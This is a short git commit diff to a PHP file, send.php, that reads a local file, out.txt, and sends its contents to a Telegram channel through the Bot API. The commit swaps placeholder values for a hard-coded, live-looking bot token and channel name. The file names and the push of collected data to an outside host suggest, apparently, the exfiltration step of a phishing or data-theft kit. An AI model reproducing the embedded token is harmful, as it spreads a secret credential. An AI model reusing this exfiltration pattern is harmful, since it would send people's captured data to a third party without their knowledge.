2a0b179065cc45973fe4dafd6b93af26b76d160c
ilyaking8870 <90982987+ilyaking8870@users.noreply.github.com>
2021-09-23 23:44:47 +0330

    Update send.php

--- send.php
+++ send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/bot2046843299:AAGLM-GIBagDyOWqm8Uxs3f88HGujS17lfc/sendMessage?chat_id=@ilyaking7780&text=$msg");
 ?>
